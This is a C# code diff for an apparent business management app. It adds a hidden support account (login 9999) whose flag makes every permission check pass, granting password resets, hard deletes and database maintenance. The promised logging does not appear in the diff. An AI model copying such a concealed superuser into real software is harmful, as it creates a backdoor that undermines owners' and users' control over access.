@@ -25,6 +25,15 @@ namespace SchettiniGestion
 
         public static int UsuarioID { get; private set; }
 
+        /// <summary>
+        /// Usuario técnico oculto de soporte (login 9999). Permisos:
+        /// acceso total a módulos, recuperación/reset de contraseñas, borrado duro
+        /// de productos/registros, configuración avanzada, mantenimiento de BD y
+        /// activación de funciones especiales. Todas sus acciones sensibles deben
+        /// registrarse en AccionesTecnicas.
+        /// </summary>
+        public static bool EsUsuarioTecnico { get; private set; }
+
         /// <summary>Nombre a persistir en ventas y movimientos: personal real o login si no hay.</summary>
         public static string NombreParaRegistro()
         {
@@ -49,6 +58,19 @@ namespace SchettiniGestion
             UsuarioID = usuarioId;
             NombrePersonal = nombrePersonal;
             Permisos = new HashSet<string>(permisos);
+            EsUsuarioTecnico = false;
+        }
+
+        public static void IniciarTecnico(string nombreUsuario, List<string> permisos)
+        {
+            NombreUsuario = nombreUsuario;
+            RolID = 1;
+            NombreRol = "Soporte Tecnico";
+            UsuarioID = -9999;
+            NombrePersonal = "Soporte Tecnico";
+            Permisos = new HashSet<string>(permisos ?? new List<string>());
+            Permisos.Add("ACCESO_TOTAL");
+            EsUsuarioTecnico = true;
         }
 
         /// <summary>
@@ -62,6 +84,9 @@ namespace SchettiniGestion
             {
                 return false; // Sesión no iniciada
             }
+
+            if (EsUsuarioTecnico)
+                return true;
 
             if (Permisos.Contains("ACCESO_TOTAL"))
                 return true;
@@ -79,6 +104,7 @@ namespace SchettiniGestion
             NombreRol = null;
             NombrePersonal = null;
             UsuarioID = 0;
+            EsUsuarioTecnico = false;
             Permisos?.Clear();
             Permisos = null;
         }
